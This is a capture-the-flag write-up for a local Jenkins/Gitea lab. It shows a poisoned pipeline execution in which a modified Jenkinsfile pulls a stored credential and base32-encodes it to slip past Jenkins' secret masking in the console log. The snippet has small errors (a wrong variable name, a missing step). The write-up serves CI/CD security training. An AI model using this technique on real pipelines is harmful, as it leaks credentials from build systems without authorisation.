# Challenge Description

<p align="center">
<img src="https://github.com/khalilsellamii/CI-CD-Security-Playground/blob/main/white-rabbit-challenge/description.png" alt="Alt text" width="500" height="300">
</p>

# Write-up and thoughts  

After accessing the Gitea hosted locally on port 3000 with the credentials  
```
username : thealice
password : thealice
```
We need to follow these steps :

`1`  Clone the white rabbit repository 
```
git clone repo_link
```
`2` Create a new branch to modify the JenkinsFile 
```
git checkout -b 'white-rabbit-challenge1'
```
Now, open the JenkinsFile with your favorite TextEditor and let's dive into the fun stuff. Modify the stage and its steps to look like :
> The JenkinsFile conatins the pipeline's jobs auotamatically executed by the jenkins server, so within this file, we will perform our PPE (Poisoned Pipeline  Execution) to retrieve the requested flag from the credentials store.
```
stage ('displaying flag'){
	steps{
	withCredentials([string(credentialsID: 'flag1', variable: 'FLAG')]) {
	sh
	'''
		echo $flag1 | base32
	'''
	}
	}
}
```
> We used base32 encoding because when asked to standard output secrets or credentials, jenkins' output console will automatically display **** instead of the actual content of the secret in order not to accidentally expose sensitive informations so we encoded it to be able to retrieve it later

`4` Commit and Push the changes to the original repository

<p align="center">
<img src="https://github.com/khalilsellamii/CI-CD-Security-Playground/blob/main/white-rabbit-challenge/git.png" alt="Alt text" width="800" height="350">
</p>

`5` Log in to Jenkins hosted locally on port 8080, and check the build history section corresponding to the white rabbit repository, you will find the build results on the output console.

<p align="center">
<img src="https://github.com/khalilsellamii/CI-CD-Security-Playground/blob/main/white-rabbit-challenge/jenkins_build.png" alt="Alt text" width="800" height="350">
</p>


<p align="center">
<img src="https://github.com/khalilsellamii/CI-CD-Security-Playground/blob/main/white-rabbit-challenge/jenkins_build_flag.png" alt="Alt text" width="800" height="350">
</p>

`6` Base32 decode your flag and submit it.
<p align="center">
<img src="https://github.com/khalilsellamii/CI-CD-Security-Playground/blob/main/white-rabbit-challenge/flag.png" alt="Alt text" width="800" height="200">
</p>


